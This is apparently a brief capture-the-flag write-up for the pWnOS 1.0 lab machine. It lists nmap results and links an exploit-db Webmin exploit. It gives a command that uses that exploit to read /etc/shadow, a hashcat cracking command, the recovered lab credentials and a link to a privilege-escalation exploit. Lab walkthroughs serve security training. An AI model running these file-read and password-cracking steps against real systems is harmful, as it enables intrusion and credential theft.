<h1>pWnOS: 1.0 Write-up</h1>

<h2>Nmap</h2>

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
```

<h3>Exploiting Port 10000</h3>

Exploit : https://www.exploit-db.com/exploits/2017

```perl exploit.pl  192.168.123.131 10000 /etc/shadow 0 ```

crack linux passwords with hashcat

```hashcat -m 500 -a 0 -o cracked.txt --force hash.txt /usr/share/wordlists/sqlmap.txt```

Username: **vmware**
Password : **h4ckm3**


<h2>Privilege Escalation</h2>

Exploit : https://www.exploit-db.com/exploits/5092

